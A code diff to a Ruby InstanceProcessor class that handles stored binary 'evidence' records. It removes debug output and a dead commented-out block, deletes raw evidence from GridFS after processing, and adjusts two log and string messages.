@@ -66,7 +66,7 @@ class InstanceProcessor
   def put_to_sleep
     @state = :stopped
     #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
-    trace :debug, "processor #{@agent['instance']} is sleeping too much, let's stop!"
+    trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
   end
   
   def finished?
@@ -94,8 +94,7 @@ class InstanceProcessor
             
             # get binary evidence
             data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
-            puts data.inspect
-            
+                        
             raise "Empty evidence" if data.nil?
             
             # deserialize binary evidence
@@ -138,42 +137,10 @@ class InstanceProcessor
               processing_time = Time.now - start_time
               trace :info, "processed #{evidence.info[:type].upcase} in #{processing_time} sec"
             end
+
+            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+            trace :debug, "deleted raw evidence #{evidence_id}"
             
-=begin
-              info = nil
-              while info.nil? do
-                info = RCS::EvidenceManager.instance.instance_info(@agent['instance'])
-              end
-
-              evidence.info[:agent] = info["bid"] unless info.nil?
-              
-              case evidence.info[:type]
-                when :CALL
-                  @call_processor.feed(evidence)
-                else
-                  # TODO: refactor as a standalone processor (ie. CommonProcessor)
-                  done = false
-                  until done
-                    begin
-
-                      # save the evidence into the db
-                      store_evidence evidence.info
-
-                      # then delete it from the sqlite repo
-                      RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @agent['instance'])
-
-                      done = true
-                    rescue Exception => e
-                      trace :debug, "[#{@agent['instance']}] UNRECOVERABLE ERROR [#{e.message}, #{e.class}]"
-                      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-                    end
-                  end
-              end
-              
-              processing_time = Time.now - start_time
-              trace :info, "processed #{evidence.info[:type].upcase} (#{data.size.to_s_bytes}) for #{@id} in #{processing_time} sec"
-            end
-=end
           rescue EvidenceDeserializeError => e
             trace :warn, "[#{@agent['instance']}] decoding failed for #{evidence_id}: " << e.to_s
             # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
@@ -195,7 +162,7 @@ class InstanceProcessor
   end
   
   def to_s
-    "instance #{@agent['instance']}: #{@evidences}"
+    "instance #{@agent['instance']}: #{@evidences.size}"
   end
   
   def store_evidence(evidence)
